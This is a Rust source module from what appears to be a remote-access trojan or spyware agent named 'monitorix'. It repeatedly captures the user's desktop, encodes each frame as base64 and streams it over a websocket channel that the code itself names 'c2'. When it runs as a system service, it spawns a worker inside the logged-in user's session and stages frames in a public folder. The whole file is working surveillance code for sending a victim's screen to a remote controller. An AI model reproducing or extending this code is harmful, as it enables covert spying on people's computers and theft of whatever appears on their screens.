use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::time::{self, Duration};
use crate::modules::screenshot_capture;
use serde_json::json;

lazy_static::lazy_static! {
    static ref LIVE_DESKTOP_ACTIVE: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
}

pub fn start_live_desktop(agent_id: String) -> Result<String, String> {
    if LIVE_DESKTOP_ACTIVE.load(Ordering::SeqCst) {
        #[cfg(target_os = "windows")]
        {
            let _ = std::fs::write("C:\\Users\\Public\\monitorix_stream.active", b"1");
            screenshot_capture::spawn_in_user_session("--stream-worker");
        }
        return Ok("Live desktop stream is already active".to_string());
    }

    LIVE_DESKTOP_ACTIVE.store(true, Ordering::SeqCst);
    
    #[cfg(target_os = "windows")]
    {
        let mut s_id = 0;
        unsafe {
            let _ = windows::Win32::System::RemoteDesktop::ProcessIdToSessionId(
                std::process::id(),
                &mut s_id,
            );
        }
        if s_id == 0 {
            let _ = std::fs::write("C:\\Users\\Public\\monitorix_stream.active", b"1");
            screenshot_capture::spawn_in_user_session("--stream-worker");
        }
    }

    // Spawn background task to stream frames
    let active = LIVE_DESKTOP_ACTIVE.clone();
    tokio::spawn(async move {
        let mut interval = time::interval(Duration::from_millis(350)); // ~3 FPS smooth & low bandwidth
        while active.load(Ordering::SeqCst) {
            interval.tick().await;
            let frame_val = tokio::task::spawn_blocking(|| {
                #[cfg(target_os = "windows")]
                {
                    let mut s_id = 0;
                    unsafe {
                        let _ = windows::Win32::System::RemoteDesktop::ProcessIdToSessionId(
                            std::process::id(),
                            &mut s_id,
                        );
                    }
                    if s_id == 0 {
                        let frame_file = "C:\\Users\\Public\\monitorix_stream_frame.jpg";
                        if let Ok(bytes) = std::fs::read(frame_file) {
                            if bytes.len() > 1000 {
                                return Some(screenshot_capture::base64_encode(&bytes));
                            }
                        }
                    }
                }
                screenshot_capture::capture_screenshot()
                    .and_then(|v| v.get("file_b64").and_then(|s| s.as_str()).map(|s| s.to_string()))
            }).await.unwrap_or(None);

            if let Some(b64) = frame_val {
                let event = json!([
                    "stream_frame",
                    {
                        "agentId": agent_id.clone(),
                        "image": format!("data:image/jpeg;base64,{}", b64)
                    }
                ]);
                let msg = format!("42{}", event.to_string());
                
                if let Some(tx) = crate::c2::websocket::WS_TX.lock().unwrap().as_ref() {
                    let _ = tx.try_send(msg);
                }
            }
        }
        println!("[Live Desktop] Stream stopped.");
    });

    Ok("Live desktop stream started".to_string())
}

pub fn stop_live_desktop() -> Result<String, String> {
    if !LIVE_DESKTOP_ACTIVE.load(Ordering::SeqCst) {
        return Err("Live desktop is not active".to_string());
    }

    LIVE_DESKTOP_ACTIVE.store(false, Ordering::SeqCst);
    #[cfg(target_os = "windows")]
    {
        let _ = std::fs::remove_file("C:\\Users\\Public\\monitorix_stream.active");
    }
    Ok("Live desktop stream stopped".to_string())
}
